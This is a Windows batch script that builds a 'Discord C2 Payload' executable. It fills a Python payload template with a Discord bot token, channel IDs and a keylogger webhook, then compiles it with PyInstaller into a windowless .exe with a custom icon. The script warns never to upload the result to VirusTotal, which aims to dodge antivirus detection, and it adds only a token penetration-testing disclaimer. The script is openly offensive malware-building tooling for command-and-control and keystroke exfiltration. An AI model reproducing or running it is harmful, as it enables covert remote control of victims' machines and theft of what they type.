@echo off
echo ===============================================
echo Discord C2 Payload Builder (Config Mode)
echo ===============================================
echo.

REM Check if UV is installed
uv --version >nul 2>&1
if %errorlevel% neq 0 (
    echo ERROR: UV package manager not found!
    echo Please install UV first: https://docs.astral.sh/uv/getting-started/installation/
    pause
    exit /b 1
)

REM Check if config.json exists
if not exist config.json (
    echo ERROR: config.json not found!
    echo Please create config.json with your Discord bot settings
    pause
    exit /b 1
)

echo [+] Installing dependencies with UV...
uv sync

echo [+] Reading configuration from config.json...

REM Use PowerShell to read JSON config
for /f "delims=" %%i in ('powershell -Command "(Get-Content config.json | ConvertFrom-Json).payload_name"') do set PAYLOAD_NAME=%%i
for /f "delims=" %%i in ('powershell -Command "(Get-Content config.json | ConvertFrom-Json).guild_id"') do set GUILD_ID=%%i
for /f "delims=" %%i in ('powershell -Command "(Get-Content config.json | ConvertFrom-Json).bot_token"') do set BOT_TOKEN=%%i
for /f "delims=" %%i in ('powershell -Command "(Get-Content config.json | ConvertFrom-Json).channel_id"') do set CHANNEL_ID=%%i
for /f "delims=" %%i in ('powershell -Command "(Get-Content config.json | ConvertFrom-Json).keylogger_webhook"') do set KEYLOGGER_WEBHOOK=%%i

REM Validate required fields
if "%GUILD_ID%"=="" (
    echo ERROR: guild_id is required in config.json!
    pause
    exit /b 1
)

if "%BOT_TOKEN%"=="" (
    echo ERROR: bot_token is required in config.json!
    pause
    exit /b 1
)

if "%CHANNEL_ID%"=="" (
    echo ERROR: channel_id is required in config.json!
    pause
    exit /b 1
)

if "%PAYLOAD_NAME%"=="" set PAYLOAD_NAME=discord_bot

echo [+] Configuration loaded:
echo    - Payload Name: %PAYLOAD_NAME%
echo    - Guild ID: %GUILD_ID%
echo    - Channel ID: %CHANNEL_ID%
echo    - Keylogger Webhook: %KEYLOGGER_WEBHOOK%

echo.
echo [+] Creating configured payload...

REM Create a copy of the template and replace placeholders
copy discord_payload.py %PAYLOAD_NAME%.py >nul

REM Replace configuration placeholders using PowerShell
powershell -Command "(Get-Content '%PAYLOAD_NAME%.py') -replace '\{GUILD_ID\}', '%GUILD_ID%' | Set-Content '%PAYLOAD_NAME%.py'"
powershell -Command "(Get-Content '%PAYLOAD_NAME%.py') -replace '\{BOT_TOKEN\}', '%BOT_TOKEN%' | Set-Content '%PAYLOAD_NAME%.py'"
powershell -Command "(Get-Content '%PAYLOAD_NAME%.py') -replace '\{CHANNEL_ID\}', '%CHANNEL_ID%' | Set-Content '%PAYLOAD_NAME%.py'"
powershell -Command "(Get-Content '%PAYLOAD_NAME%.py') -replace '\{KEYLOGGER_WEBHOOK\}', '%KEYLOGGER_WEBHOOK%' | Set-Content '%PAYLOAD_NAME%.py'"

echo [+] Building executable with PyInstaller...

REM Install PyInstaller if not already installed
uv add pyinstaller

REM Build the executable
uv run pyinstaller --onefile --noconsole --icon=img/exe_file.ico --name=%PAYLOAD_NAME% %PAYLOAD_NAME%.py

if %errorlevel% equ 0 (
    echo.
    echo ===============================================
    echo BUILD SUCCESSFUL!
    echo ===============================================
    echo Executable created: dist\%PAYLOAD_NAME%.exe
    echo.
    echo IMPORTANT SECURITY NOTES:
    echo - DO NOT upload to VirusTotal or similar services
    echo - Test in isolated environment first
    echo - Use only for authorized penetration testing
    echo ===============================================
    
    REM Clean up temporary files
    del %PAYLOAD_NAME%.py >nul 2>&1
    del %PAYLOAD_NAME%.spec >nul 2>&1
    
) else (
    echo.
    echo ===============================================
    echo BUILD FAILED!
    echo ===============================================
    echo Check the error messages above for details.
)

echo.
pause
